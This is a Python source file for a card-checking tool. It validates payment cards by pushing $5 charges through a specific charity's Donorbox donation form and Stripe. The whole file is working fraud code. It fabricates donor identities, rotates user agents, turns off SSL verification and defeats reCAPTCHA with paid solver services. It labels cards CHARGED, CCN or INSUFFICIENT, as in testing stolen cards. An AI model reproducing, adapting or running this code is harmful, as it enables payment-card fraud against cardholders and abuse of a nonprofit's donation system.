import asyncio
import aiohttp
import random
import json
import re
from typing import Tuple, Optional

from recaptcha_bypass import get_recaptcha_v3_token, solve_recaptcha_v2, has_solver_key


class DonorboxChecker:
    EMBED_URL = "https://donorbox.org/embed/beast-pantry"
    DONATE_URL = "https://donorbox.org/donation"
    STRIPE_PK = "pk_live_1TiySUjG2VvU27ZhnX775lWtq4Gq45tuRo3f47l3fel2t9TuG0hHT2dc9IuyITSCdm8scWA6aQ50qIPoPZ8DZuMns009QRfWOPT"
    SITEKEY_V3 = "6LcoYTscAAAAAM9KqIDhNEH8nQY_e9vOyA2M9YJz"
    SITEKEY_V2 = "6LdMYDscAAAAABUvGKEqx3VV8KWHT76KbTM7SP9i"
    DOMAIN = "donorbox.org"
    PAGE_URL = "https://donorbox.org/embed/beast-pantry"

    FIRST_NAMES = [
        "James","Mary","Robert","Patricia","John","Jennifer","Michael","Linda",
        "David","Elizabeth","William","Barbara","Richard","Susan","Joseph","Jessica",
        "Thomas","Sarah","Charles","Karen","Christopher","Lisa","Daniel","Nancy",
    ]
    LAST_NAMES = [
        "Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
        "Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson",
        "Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson",
    ]
    CITIES = [
        ("New York","NY","10001"),("Los Angeles","CA","90001"),("Chicago","IL","60601"),
        ("Houston","TX","77001"),("Phoenix","AZ","85001"),("Philadelphia","PA","19101"),
        ("San Diego","CA","92101"),("Dallas","TX","75201"),("Denver","CO","80201"),
        ("Portland","OR","97201"),("Seattle","WA","98101"),("Boston","MA","02101"),
    ]

    def __init__(self):
        self._ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
        ]
        self._csrf_token: Optional[str] = None
        self._csrf_ts: float = 0

    def _ua(self) -> str:
        return random.choice(self._ua_list)

    def _rand_identity(self) -> dict:
        first = random.choice(self.FIRST_NAMES)
        last = random.choice(self.LAST_NAMES)
        city, state, zipcode = random.choice(self.CITIES)
        email = f"{first.lower()}{last.lower()}{random.randint(100,9999)}@protonmail.com"
        return {
            "first": first,
            "last": last,
            "email": email,
            "zip": zipcode,
            "country": "US",
        }

    async def _get_csrf(self, session: aiohttp.ClientSession) -> Optional[str]:
        try:
            headers = {
                "User-Agent": self._ua(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            }
            async with session.get(self.EMBED_URL, headers=headers) as resp:
                html = await resp.text()
            csrf = re.findall(
                r'<meta\s+name=["\']csrf-token["\']\s+content=["\']([\w+/=\-]+)',
                html,
            )
            if csrf:
                return csrf[0]
            return None
        except Exception:
            return None

    async def _create_stripe_pm(
        self, cc: str, mm: str, yy: str, cvv: str, identity: dict,
        session: aiohttp.ClientSession,
    ) -> Optional[str]:
        if len(yy) == 2:
            yy = f"20{yy}"
        try:
            data = {
                "type": "card",
                "card[number]": cc,
                "card[exp_month]": mm,
                "card[exp_year]": yy,
                "card[cvc]": cvv,
                "billing_details[name]": f"{identity['first']} {identity['last']}",
                "key": self.STRIPE_PK,
            }
            async with session.post(
                "https://api.stripe.com/v1/payment_methods",
                data=data,
                headers={"User-Agent": self._ua()},
            ) as resp:
                result = await resp.json()

            if result.get("error"):
                return None
            return result.get("id")
        except Exception:
            return None

    async def check_card(
        self, cc: str, mm: str, yy: str, cvv: str
    ) -> Tuple[str, str]:
        if len(yy) == 4:
            yy_short = yy[2:]
        else:
            yy_short = yy

        connector = aiohttp.TCPConnector(ssl=False, limit=5)
        timeout = aiohttp.ClientTimeout(total=120)
        jar = aiohttp.CookieJar(unsafe=True)
        async with aiohttp.ClientSession(
            connector=connector, timeout=timeout, cookie_jar=jar
        ) as session:
            csrf = await self._get_csrf(session)
            if not csrf:
                return "ERROR", "Failed to get CSRF token from Donorbox"

            identity = self._rand_identity()

            pm_id = await self._create_stripe_pm(
                cc, mm, yy_short, cvv, identity, session
            )
            if not pm_id:
                return "DECLINED", "Stripe PM creation failed (invalid card)"

            v3_token = await get_recaptcha_v3_token(
                self.SITEKEY_V3, self.DOMAIN, session=session
            )

            form_data = {
                "donation[form_id]": "213200",
                "donation[form_version]": "1.0",
                "donation[acquisition_channel_attributes][name]": "embed",
                "donation[acquisition_channel_attributes][source]": "https",
                "currency": "usd",
                "slug": "beast-pantry",
                "s": "beast-pantry",
                "t": "1OTA2NQ",
                "donation_type": "stripe",
                "fee_amount": "0",
                "embedded_form": "true",
                "new_indian_regulation": "false",
                "donation[suggested_amount_index]": "0",
                "donation[suggested_amount]": "5",
                "donation[first_name]": identity["first"],
                "donation[last_name]": identity["last"],
                "donation[email]": identity["email"],
                "donation[country]": identity["country"],
                "donation[zip_code]": identity["zip"],
                "stripe_pm_id": pm_id,
                "stripe_public_key": self.STRIPE_PK,
                "manual_us_bank_account_enabled": "false",
            }

            if v3_token:
                form_data["g-recaptcha-response-data[donation_create]"] = v3_token

            submit_headers = {
                "User-Agent": self._ua(),
                "X-CSRF-Token": csrf,
                "X-Requested-With": "XMLHttpRequest",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Origin": "https://donorbox.org",
                "Referer": self.EMBED_URL,
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            }

            try:
                async with session.post(
                    self.DONATE_URL,
                    data=form_data,
                    headers=submit_headers,
                ) as resp:
                    status_code = resp.status
                    try:
                        data = await resp.json()
                    except Exception:
                        text = await resp.text()
                        return "ERROR", f"Non-JSON response ({status_code}): {text[:120]}"
            except Exception as e:
                return "ERROR", f"Request failed: {str(e)[:100]}"

            if isinstance(data, dict) and data.get("error_type") == "recaptcha":
                v2_token = await solve_recaptcha_v2(
                    self.SITEKEY_V2, self.PAGE_URL, session=session
                )
                if not v2_token:
                    return "ERROR", "reCAPTCHA v2 required — set CAPSOLVER_API_KEY or TWOCAPTCHA_API_KEY"

                csrf2 = await self._get_csrf(session)
                if csrf2:
                    submit_headers["X-CSRF-Token"] = csrf2

                form_data["g-recaptcha-response"] = v2_token
                try:
                    async with session.post(
                        self.DONATE_URL,
                        data=form_data,
                        headers=submit_headers,
                    ) as resp2:
                        status_code = resp2.status
                        try:
                            data = await resp2.json()
                        except Exception:
                            text = await resp2.text()
                            return "ERROR", f"Non-JSON v2 response ({status_code}): {text[:120]}"
                except Exception as e:
                    return "ERROR", f"v2 request failed: {str(e)[:100]}"

            return self._parse_response(status_code, data)

    def _parse_response(self, status_code: int, data) -> Tuple[str, str]:
        if not isinstance(data, dict):
            return "ERROR", f"Unexpected response: {str(data)[:120]}"

        status = data.get("status", "")
        msg = data.get("msg", "")
        error_type = data.get("error_type", "")

        if error_type == "recaptcha":
            return "ERROR", "reCAPTCHA validation failed after retry"

        if status == "ok":
            return "CHARGED", f"$5 donation processed | {msg[:80]}"

        if status == "nok" and msg:
            return self._classify_stripe_error(msg)

        if status_code == 200 and not status:
            return "APPROVED", f"Accepted: {json.dumps(data)[:120]}"

        return "ERROR", f"HTTP {status_code}: {json.dumps(data)[:120]}"

    def _classify_stripe_error(self, msg: str) -> Tuple[str, str]:
        msg_lower = msg.lower()

        decline_keywords = [
            "declined", "decline", "do not honor", "insufficient",
            "card_declined", "lost_card", "stolen_card", "expired_card",
            "pickup_card", "restricted", "not permitted", "exceeds",
            "fraud", "security", "try_again_later", "generic_decline",
            "your card was declined", "transaction not allowed",
        ]
        for kw in decline_keywords:
            if kw in msg_lower:
                if "insufficient" in msg_lower:
                    return "INSUFFICIENT", f"INSUFFICIENT | {msg}"
                return "DECLINED", f"DECLINED | {msg}"

        ccn_keywords = [
            "incorrect_number", "invalid_number", "invalid number",
            "card number is invalid", "invalid_expiry",
        ]
        for kw in ccn_keywords:
            if kw in msg_lower:
                return "CCN", f"CCN | {msg}"

        if "cvc" in msg_lower or "security code" in msg_lower:
            return "CCN", f"CCN | {msg}"

        if "succeeded" in msg_lower or "approved" in msg_lower:
            return "APPROVED", f"APPROVED | {msg}"

        return "DECLINED", f"DECLINED | {msg}"
